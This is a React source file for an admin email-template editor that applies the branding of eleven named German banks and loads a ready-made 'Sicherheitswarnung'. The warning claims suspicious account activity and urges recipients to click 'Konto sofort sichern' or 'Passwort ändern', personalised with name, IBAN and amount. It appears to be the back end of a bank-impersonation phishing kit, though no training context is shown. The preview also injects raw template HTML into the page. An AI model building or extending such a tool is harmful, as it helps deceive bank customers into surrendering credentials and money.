import React, { useState, useEffect } from 'react';
import { useNavigate, useParams } from 'react-router-dom';
import { ArrowLeft, Save, AlertCircle, Loader, Trash, Tag, Copy, Check, Code, Eye } from 'lucide-react';
import { useEmailTemplates } from '../hooks/useEmailTemplates';
import { toast } from 'react-toastify';
import { getBankBranding } from '../constants/bankEmailBranding';

// Function to personalize preview content with test data
const personalizePreview = (html: string, data: Record<string, string>) => {
  let result = html;
  
  // Replace {{variable}} placeholders with actual values
  Object.entries(data).forEach(([key, value]) => {
    const regex = new RegExp(`{{\s*${key}\s*}}`, 'g');
    result = result.replace(regex, value);
  });
  
  return result;
};

export const EmailTemplateEditor: React.FC = () => {
  const { id } = useParams<{ id: string }>();
  const navigate = useNavigate();
  const isEditMode = id !== 'new';
  
  const {
    isLoading: isLoadingTemplates,
    fetchTemplate,
    createTemplate,
    updateTemplate,
    deleteTemplate,
    isCreating,
    isUpdating,
    isDeleting
  } = useEmailTemplates();

  const [name, setName] = useState('');
  const [subject, setSubject] = useState('');
  const [bankName, setBankName] = useState('');
  const [templateType, setTemplateType] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);
  const [showVariablesHelper, setShowVariablesHelper] = useState(false);
  const [htmlContent, setHtmlContent] = useState('');
  const [copied, setCopied] = useState('');
  const [previewMode, setPreviewMode] = useState(false);
  const [previewData, setPreviewData] = useState({
    email: 'kunde@example.com',
    firstName: 'Max',
    lastName: 'Mustermann',
    fullName: 'Max Mustermann',
    accountNumber: 'DE89 3704 0044 0532 0130 00',
    amount: '250,00 €',
    date: new Date().toLocaleDateString('de-DE'),
    transactionId: 'TXN-123456789'
  });

  useEffect(() => {
    const loadTemplate = async () => {
      if (isEditMode && id) {
        try {
          setIsLoading(true);
          const template = await fetchTemplate(parseInt(id));
          setName(template.name);
          setSubject(template.subject);
          setHtmlContent(template.html_content);
          setBankName(template.bank_name || '');
          setTemplateType(template.template_type || '');
        } catch (err) {
          setError('Fehler beim Laden der E-Mail-Vorlage. Bitte versuchen Sie es später erneut.');
          console.error('Error loading template:', err);
        } finally {
          setIsLoading(false);
        }
      } else {
        // Default template for new email
        const branding = bankName ? getBankBranding(bankName) : null;
        const defaultHtml = `<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{subject}}</title>
  <style>
        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f4f4f4; }
        .container { max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 8px; overflow: hidden; }
        .header { background-color: ${branding?.headerStyle.backgroundColor || '#dc2626'}; color: ${branding?.headerStyle.textColor || '#ffffff'}; padding: 40px 30px; text-align: center; }
        .content { padding: 40px 30px; }
        .alert { background-color: #fff5f5; border: 2px solid #ef4444; border-radius: 8px; padding: 25px; margin: 25px 0; text-align: center; }
        .button { display: inline-block; padding: 16px 32px; background: ${branding?.buttonStyle.backgroundColor || '#dc2626'}; color: ${branding?.buttonStyle.textColor || '#ffffff'}; text-decoration: none; border-radius: 6px; margin: 10px; }
        .footer { background-color: #f8f9fa; padding: 30px 20px; text-align: center; color: #666666; font-size: 14px; }
        @media only screen and (max-width: 600px) {
            .header, .content, .footer { padding: 20px !important; }
            .button { display: block !important; width: 100% !important; margin: 10px 0 !important; }
        }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
            <h1>${branding?.displayName || 'Bank'} - Wichtige Mitteilung</h1>
    </div>
    <div class="content">
            <div class="alert">
                <h2>Wichtige Benachrichtigung</h2>
                <p>Sehr geehrte/r {{firstName}} {{lastName}},</p>
                <p>dies ist eine wichtige Mitteilung bezüglich Ihres Kontos.</p>
            </div>
            <p>Weitere Details finden Sie in Ihrem Online-Banking oder kontaktieren Sie unseren Kundenservice.</p>
            <p style="text-align: center;">
                <a href="#action" class="button">Jetzt handeln</a>
            </p>
            <p>Mit freundlichen Grüßen,<br>
            <strong>Ihr ${branding?.displayName || 'Bank'} Team</strong></p>
    </div>
    <div class="footer">
            <p><strong>${branding?.displayName || 'Bank'} Kundenservice</strong><br>
            Telefon: ${branding?.supportPhone || 'N/A'}<br>
            E-Mail: ${branding?.supportEmail || 'N/A'}</p>
            <p>Diese E-Mail wurde an {{email}} gesendet.</p>
        </div>
  </div>
</body>
</html>`;
        setHtmlContent(defaultHtml);
      }
    };

    loadTemplate();
  }, [isEditMode, id, fetchTemplate, bankName]);

  const handleSave = async () => {
    if (!name || !subject || !htmlContent) {
      setError('Bitte füllen Sie alle Pflichtfelder aus.');
      return;
    }

    try {
      const templateData = {
        name,
        subject,
        html_content: htmlContent,
        design_json: null, // No design JSON for HTML editor
        category: bankName || '',
        bank_name: bankName || null,
        template_type: templateType || null
      };
      
      if (isEditMode && id) {
        await updateTemplate({ ...templateData, id: parseInt(id) });
        toast.success('E-Mail-Vorlage erfolgreich aktualisiert!');
      } else {
        await createTemplate(templateData);
        toast.success('E-Mail-Vorlage erfolgreich erstellt!');
      }
      
      navigate('/admin/email-templates');
    } catch (err) {
      setError('Fehler beim Speichern der E-Mail-Vorlage. Bitte versuchen Sie es später erneut.');
      console.error('Error saving template:', err);
      toast.error('Fehler beim Speichern der Vorlage');
    }
  };

  const handleDelete = async () => {
    if (!isEditMode || !id) return;
    
    try {
      await deleteTemplate(parseInt(id));
      toast.success('E-Mail-Vorlage erfolgreich gelöscht!');
      navigate('/admin/email-templates');
    } catch (err) {
      setError('Fehler beim Löschen der E-Mail-Vorlage. Bitte versuchen Sie es später erneut.');
      console.error('Error deleting template:', err);
      toast.error('Fehler beim Löschen der Vorlage');
    }
  };

  const loadBankTemplate = () => {
    if (!bankName) {
      toast.error('Bitte wählen Sie zuerst eine Bank aus');
      return;
    }

    const branding = getBankBranding(bankName);
    if (!branding) {
      toast.error('Branding für diese Bank nicht gefunden');
      return;
    }

    // Generate bank-specific template
    const bankTemplate = `<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{subject}}</title>
    <style>
        body { font-family: ${branding.fonts.join(', ')}; margin: 0; padding: 0; background-color: #f4f4f4; }
        .container { max-width: 600px; margin: 0 auto; background-color: #ffffff; border-radius: 8px; overflow: hidden; }
        .header { background: linear-gradient(135deg, ${branding.headerStyle.backgroundColor} 0%, ${branding.primaryColor} 100%); color: ${branding.headerStyle.textColor}; padding: 40px 30px; text-align: center; }
        .content { padding: 40px 30px; }
        .alert { background-color: #fff5f5; border: 2px solid #ef4444; border-radius: 8px; padding: 25px; margin: 25px 0; text-align: center; }
        .button { display: inline-block; padding: 16px 32px; background: ${branding.buttonStyle.backgroundColor}; color: ${branding.buttonStyle.textColor}; text-decoration: none; border-radius: ${branding.buttonStyle.borderRadius}; margin: 10px; font-weight: bold; }
        .footer { background-color: #f8f9fa; padding: 30px 20px; text-align: center; color: #666666; font-size: 14px; border-top: 3px solid ${branding.primaryColor}; }
        .details { background: #f8f9fa; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 4px solid ${branding.primaryColor}; }
        @media only screen and (max-width: 600px) {
            .header, .content, .footer { padding: 20px !important; }
            .button { display: block !important; width: 100% !important; margin: 10px 0 !important; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚠️ Sicherheitswarnung</h1>
            <p>${branding.displayName} - Verdächtige Aktivität entdeckt</p>
        </div>
        <div class="content">
            <div class="alert">
                <h2>WICHTIGE SICHERHEITSBENACHRICHTIGUNG</h2>
                <p>Wir haben ungewöhnliche Aktivitäten in Ihrem ${branding.displayName}-Konto festgestellt.</p>
            </div>
            <p>Sehr geehrte/r {{firstName}} {{lastName}},</p>
            <p>unser Sicherheitssystem hat verdächtige Aktivitäten in Ihrem ${branding.displayName}-Konto entdeckt. 
            Zu Ihrer Sicherheit haben wir bestimmte Funktionen vorsorglich eingeschränkt.</p>
            
            <div class="details">
                <h3>Details der verdächtigen Aktivität</h3>
                <p><strong>Datum:</strong> {{date}}</p>
                <p><strong>Konto:</strong> {{accountNumber}}</p>
                <p><strong>Betrag:</strong> {{amount}}</p>
                <p><strong>Referenz:</strong> {{transactionId}}</p>
            </div>
            
            <p style="text-align: center;">
                <a href="#secure" class="button">🔒 Konto sofort sichern</a>
                <a href="#password" class="button" style="background: #ffffff; color: ${branding.primaryColor}; border: 2px solid ${branding.primaryColor};">🔑 Passwort ändern</a>
            </p>
            
            <p><strong>Wichtiger Hinweis:</strong> ${branding.displayName} fragt niemals per E-Mail nach Zugangsdaten, PIN oder TAN!</p>
            
            <p>Mit freundlichen Grüßen<br>
            <strong>Ihr ${branding.displayName} Sicherheitsteam</strong></p>
        </div>
        <div class="footer">
            <p><strong>${branding.displayName} Kundenservice</strong><br>
            Telefon: ${branding.supportPhone || 'N/A'}<br>
            E-Mail: ${branding.supportEmail || 'N/A'}</p>
            <p><a href="{{unsubscribeLink}}">Abmelden</a> | <a href="{{privacyPolicyUrl}}">Datenschutz</a></p>
        </div>
    </div>
</body>
</html>`;

    setHtmlContent(bankTemplate);
    toast.success(`${branding.displayName} Vorlage geladen!`);
  };

  if (isLoading || isLoadingTemplates) {
    return (
      <div className="flex justify-center items-center h-64">
        <Loader className="h-8 w-8 text-red-600 animate-spin" />
        <span className="ml-2 text-gray-600">Lade E-Mail-Vorlage...</span>
      </div>
    );
  }

  return (
    <div className="space-y-6">
      <div className="flex justify-between items-center pb-4 border-b border-gray-200">
        <div className="flex items-center">
          <button
            onClick={() => navigate('/admin/email-templates')}
            className="mr-4 p-2 rounded-full hover:bg-gray-100"
          >
            <ArrowLeft size={20} className="text-gray-600" />
          </button>
          <h1 className="text-2xl font-bold text-gray-900">
            {isEditMode ? 'E-Mail-Vorlage bearbeiten' : 'Neue E-Mail-Vorlage erstellen'}
          </h1>
        </div>
        <div className="flex space-x-3">
          {isEditMode && (
            <button
              onClick={() => setShowDeleteConfirm(true)}
              className="px-4 py-2 border border-red-300 text-red-600 rounded-md hover:bg-red-50"
              disabled={isDeleting}
            >
              <Trash size={18} className="inline-block mr-1" />
              Löschen
            </button>
          )}
          <button
            onClick={handleSave}
            className="px-6 py-2.5 bg-red-600 text-white rounded-md hover:bg-red-700 focus:ring-2 focus:ring-red-500 focus:ring-offset-2 disabled:opacity-50 shadow-sm transition-all duration-200 ease-in-out flex items-center"
            disabled={isCreating || isUpdating}
          >
            <Save size={18} className="mr-2" />
            {isCreating || isUpdating ? 'Wird gespeichert...' : 'Speichern'}
          </button>
        </div>
      </div>

      {error && (
        <div className="bg-red-50 border-l-4 border-red-400 p-4 flex items-start">
          <AlertCircle className="h-5 w-5 text-red-500 mr-2 flex-shrink-0 mt-0.5" />
          <div>
            <p className="text-red-700">{error}</p>
            <button
              onClick={() => setError(null)}
              className="text-red-500 text-sm hover:underline mt-1"
            >
              Schließen
            </button>
          </div>
        </div>
      )}

      {/* Template metadata fields */}
      <div className="bg-white shadow rounded-lg p-6">
        <h2 className="text-lg font-semibold text-gray-900 mb-4">Vorlageninformationen</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
          <div>
            <label htmlFor="name" className="block text-sm font-semibold text-gray-700 mb-2">
              Name der Vorlage <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              id="name"
              value={name}
              onChange={(e) => setName(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
              placeholder="Name der E-Mail-Vorlage eingeben"
              required
            />
          </div>
          
          <div>
            <label htmlFor="subject" className="block text-sm font-semibold text-gray-700 mb-2">
              E-Mail-Betreff <span className="text-red-500">*</span>
            </label>
            <input
              type="text"
              id="subject"
              value={subject}
              onChange={(e) => setSubject(e.target.value)}
              className="w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors"
              placeholder="Betreffzeile der E-Mail eingeben"
              required
            />
          </div>
          
          <div>
            <label htmlFor="bankName" className="block text-sm font-semibold text-gray-700 mb-2">
              Bank
            </label>
            <select
              id="bankName"
              value={bankName}
              onChange={(e) => setBankName(e.target.value)}
              className="block w-full px-4 py-3 pr-10 rounded-md border-gray-300 bg-white focus:ring-2 focus:ring-red-500 focus:border-red-500 transition-all duration-200 ease-in-out shadow-sm appearance-none sm:text-sm"
            >
              <option value="">-- Wählen Sie eine Bank --</option>
              <option value="commerzbank">Commerzbank</option>
              <option value="santander">Santander</option>
              <option value="apobank">Apobank</option>
              <option value="sparkasse">Sparkasse</option>
              <option value="postbank">Postbank</option>
              <option value="dkb">DKB</option>
              <option value="volksbank">Volksbank</option>
              <option value="comdirect">Comdirect</option>
              <option value="consorsbank">Consorsbank</option>
              <option value="ingdiba">ING DiBa</option>
              <option value="deutsche_bank">Deutsche Bank</option>
            </select>
          </div>
          
          <div>
            <label htmlFor="templateType" className="block text-sm font-semibold text-gray-700 mb-2">
              Template-Typ
            </label>
            <select
              id="templateType"
              value={templateType}
              onChange={(e) => setTemplateType(e.target.value)}
              className="block w-full px-4 py-3 pr-10 rounded-md border-gray-300 bg-white focus:ring-2 focus:ring-red-500 focus:border-red-500 transition-all duration-200 ease-in-out shadow-sm appearance-none sm:text-sm"
            >
              <option value="">-- Wählen Sie einen Template-Typ --</option>
              <option value="welcome">Willkommen/Onboarding</option>
              <option value="security">Sicherheit & Verifizierung</option>
              <option value="transaction">Transaktions-Benachrichtigungen</option>
              <option value="marketing">Marketing & Werbung</option>
              <option value="support">Support & Service</option>
            </select>
          </div>
        </div>
        
        {bankName && (
          <div className="mt-4 p-4 bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-lg">
            <div className="flex items-center justify-between">
              <div className="flex items-center">
                <div className="w-3 h-3 rounded-full bg-green-500 mr-2 animate-pulse"></div>
                <span className="text-sm font-medium text-gray-700">
                  {getBankBranding(bankName)?.displayName} Branding aktiv
                </span>
              </div>
              <button
                onClick={loadBankTemplate}
                className="px-4 py-2 bg-green-600 text-white rounded-md hover:bg-green-700 text-sm font-medium"
              >
                Bank-Vorlage laden
              </button>
            </div>
          </div>
        )}
      </div>

      {/* Editor mode toggle */}
      <div className="flex space-x-4 mb-6">
        <button
          type="button"
          onClick={() => setPreviewMode(false)}
          className={`px-6 py-2.5 rounded-md flex items-center shadow-sm transition-all duration-200 ease-in-out ${
            !previewMode
              ? 'bg-red-600 text-white hover:bg-red-700 ring-2 ring-red-500 ring-offset-2'
              : 'bg-white text-gray-700 border border-gray-300 hover:bg-gray-50'
          }`}
        >
          <Code size={18} className="mr-2" />
          HTML bearbeiten
        </button>
        <button
          type="button"
          onClick={() => setPreviewMode(true)}
          className={`px-6 py-2.5 rounded-md flex items-center shadow-sm transition-all duration-200 ease-in-out ${
            previewMode
              ? 'bg-red-600 text-white hover:bg-red-700 ring-2 ring-red-500 ring-offset-2'
              : 'bg-white text-gray-700 border border-gray-300 hover:bg-gray-50'
          }`}
        >
          <Eye size={18} className="mr-2" />
          Vorschau
        </button>
        <button
          type="button"
          onClick={() => setShowVariablesHelper(true)}
          className="px-6 py-2.5 rounded-md flex items-center shadow-sm transition-all duration-200 ease-in-out bg-white text-gray-700 border border-gray-300 hover:bg-gray-50"
        >
          <Tag size={18} className="mr-2" />
          Variablen anzeigen
        </button>
      </div>

      {!previewMode ? (
        /* HTML Code Editor */
        <div className="bg-white shadow rounded-lg p-6">
          <div className="flex justify-between items-center mb-4">
            <h2 className="text-lg font-semibold text-gray-900">HTML-Code bearbeiten</h2>
            <div className="bg-yellow-50 border border-yellow-200 rounded-lg px-3 py-2">
              <p className="text-sm text-yellow-800">
                🚧 <strong>Migration in Arbeit:</strong> Easy Email Editor wird bald integriert für bessere Drag-and-Drop Funktionalität
              </p>
            </div>
          </div>
              <textarea
                value={htmlContent}
                onChange={(e) => setHtmlContent(e.target.value)}
            className="w-full h-96 px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:ring-red-500 focus:border-red-500 text-sm bg-white hover:border-gray-400 transition-colors font-mono"
                spellCheck="false"
            placeholder="HTML-Code hier einfügen..."
                required
              />
          <p className="mt-2 text-sm text-gray-500">
                Sie können Platzhalter wie {`{{firstName}}`} verwenden, die später durch den tatsächlichen Wert ersetzt werden.
              </p>
        </div>
      ) : (
        /* Preview */
        <div className="bg-white border rounded-lg shadow-sm">
          <div className="border-b border-gray-200 bg-gray-50 px-4 py-3 flex justify-between items-center">
            <div>
              <h3 className="text-sm font-medium text-gray-700">Vorschau: {subject}</h3>
              <p className="text-xs text-gray-500 mt-1">Bank: {getBankBranding(bankName)?.displayName || 'Keine Bank'}</p>
            </div>
          </div>
          <div className="p-6 overflow-auto" style={{ maxHeight: '60vh' }}>
            <div className="mb-4 p-3 bg-gray-50 border border-gray-200 rounded-md">
              <h4 className="text-sm font-medium text-gray-700 mb-2">Personalisierungsdaten für Vorschau:</h4>
              <div className="grid grid-cols-2 gap-2">
                {Object.entries(previewData).map(([key, value]) => (
                  <div key={key} className="flex items-center">
                    <span className="text-xs text-gray-500 mr-1">{key}:</span>
                    <input
                      type="text"
                      value={value}
                      onChange={(e) => setPreviewData({...previewData, [key]: e.target.value})}
                      className="text-xs p-1 border border-gray-300 rounded w-full"
                    />
                  </div>
                ))}
              </div>
            </div>
            <div 
              className="email-preview"
              dangerouslySetInnerHTML={{ __html: personalizePreview(htmlContent, previewData) }} 
            />
          </div>
        </div>
      )}

      {/* Personalization variables helper modal */}
      {showVariablesHelper && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg shadow-xl max-w-2xl w-full p-6 max-h-[80vh] overflow-auto">
            <div className="flex justify-between items-center mb-4">
              <h3 className="text-lg font-medium text-gray-900">Verfügbare Personalisierungsvariablen</h3>
              <button
                onClick={() => setShowVariablesHelper(false)}
                className="text-gray-400 hover:text-gray-500"
                type="button"
              >
                <span className="sr-only">Schließen</span>
                <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
                </svg>
              </button>
            </div>
            
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-4">
              <p className="text-sm text-blue-800">
                <strong>💡 Tipp:</strong> Kopieren Sie die Variable und fügen Sie sie in Ihren HTML-Code ein.
              </p>
            </div>
            
            <div className="space-y-4">
              <div>
                <h4 className="text-sm font-medium text-gray-700 mb-3">Empfängerdaten</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                  {[
                    { name: 'email', desc: 'E-Mail-Adresse des Empfängers', sample: 'kunde@example.com' },
                    { name: 'firstName', desc: 'Vorname des Empfängers', sample: 'Max' },
                    { name: 'lastName', desc: 'Nachname des Empfängers', sample: 'Mustermann' },
                    { name: 'fullName', desc: 'Vollständiger Name des Empfängers', sample: 'Max Mustermann' }
                  ].map(variable => (
                    <button
                      key={variable.name}
                      onClick={() => {
                        navigator.clipboard.writeText(`{{${variable.name}}}`);
                        setCopied(variable.name);
                        setTimeout(() => setCopied(''), 2000);
                        toast.success(`Variable {{${variable.name}}} kopiert`);
                      }}
                      className="flex items-center justify-between p-3 border border-gray-200 rounded-md hover:bg-gray-50 text-left transition-colors"
                    >
                      <div className="flex-1">
                        <code className="text-sm font-mono text-red-600 font-semibold">{`{{${variable.name}}}`}</code>
                        <p className="text-xs text-gray-500 mt-1">{variable.desc}</p>
                        <p className="text-xs text-gray-400 mt-0.5">Beispiel: {variable.sample}</p>
                      </div>
                      {copied === variable.name ? (
                        <Check size={16} className="text-green-500 ml-2" />
                      ) : (
                        <Copy size={16} className="text-gray-400 ml-2" />
                      )}
                    </button>
                  ))}
                </div>
              </div>
              
              <div>
                <h4 className="text-sm font-medium text-gray-700 mb-3">Bankdaten & Transaktionen</h4>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                  {[
                    { name: 'accountNumber', desc: 'IBAN des Kontos', sample: 'DE89 3704 0044 0532 0130 00' },
                    { name: 'amount', desc: 'Betrag (mit Währungssymbol)', sample: '250,00 €' },
                    { name: 'date', desc: 'Aktuelles Datum', sample: new Date().toLocaleDateString('de-DE') },
                    { name: 'transactionId', desc: 'Transaktions-ID', sample: 'TXN-123456789' }
                  ].map(variable => (
                    <button
                      key={variable.name}
                      onClick={() => {
                        navigator.clipboard.writeText(`{{${variable.name}}}`);
                        setCopied(variable.name);
                        setTimeout(() => setCopied(''), 2000);
                        toast.success(`Variable {{${variable.name}}} kopiert`);
                      }}
                      className="flex items-center justify-between p-3 border border-gray-200 rounded-md hover:bg-gray-50 text-left transition-colors"
                    >
                      <div className="flex-1">
                        <code className="text-sm font-mono text-red-600 font-semibold">{`{{${variable.name}}}`}</code>
                        <p className="text-xs text-gray-500 mt-1">{variable.desc}</p>
                        <p className="text-xs text-gray-400 mt-0.5">Beispiel: {variable.sample}</p>
                      </div>
                      {copied === variable.name ? (
                        <Check size={16} className="text-green-500 ml-2" />
                      ) : (
                        <Copy size={16} className="text-gray-400 ml-2" />
                      )}
                    </button>
                  ))}
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Delete confirmation modal */}
      {showDeleteConfirm && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-lg shadow-xl max-w-md w-full p-6">
            <div className="flex items-center mb-4">
              <div className="flex-shrink-0 w-12 h-12 rounded-full bg-red-100 flex items-center justify-center">
                <Trash className="h-6 w-6 text-red-600" />
              </div>
              <h3 className="ml-4 text-lg font-medium text-gray-900">E-Mail-Vorlage löschen</h3>
            </div>
            <p className="text-gray-600 mb-6">
              Sind Sie sicher, dass Sie diese E-Mail-Vorlage löschen möchten? Diese Aktion kann nicht rückgängig gemacht werden.
            </p>
            <div className="flex justify-end space-x-3">
              <button
                onClick={() => setShowDeleteConfirm(false)}
                className="px-4 py-2 border border-gray-300 rounded-md shadow-sm text-sm font-medium text-gray-700 bg-white hover:bg-gray-50"
              >
                Abbrechen
              </button>
              <button
                onClick={handleDelete}
                className="px-4 py-2 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-red-600 hover:bg-red-700 disabled:opacity-50"
                disabled={isDeleting}
              >
                {isDeleting ? 'Wird gelöscht...' : 'Löschen bestätigen'}
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};